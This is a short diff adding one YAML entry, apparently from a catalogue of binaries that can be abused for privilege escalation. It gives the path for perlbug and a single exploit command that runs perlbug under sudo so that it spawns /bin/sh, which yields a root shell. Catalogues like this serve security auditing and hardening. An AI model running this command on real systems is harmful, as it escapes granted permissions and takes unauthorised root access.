@@ -1,0 +1,4 @@
+name: perlbug
+binary_path: /usr/bin/perlbug
+exploit_cmds:
+- 'sudo /usr/bin/perlbug -s ''x x x'' -r x -c x -e ''exec /bin/sh #'''
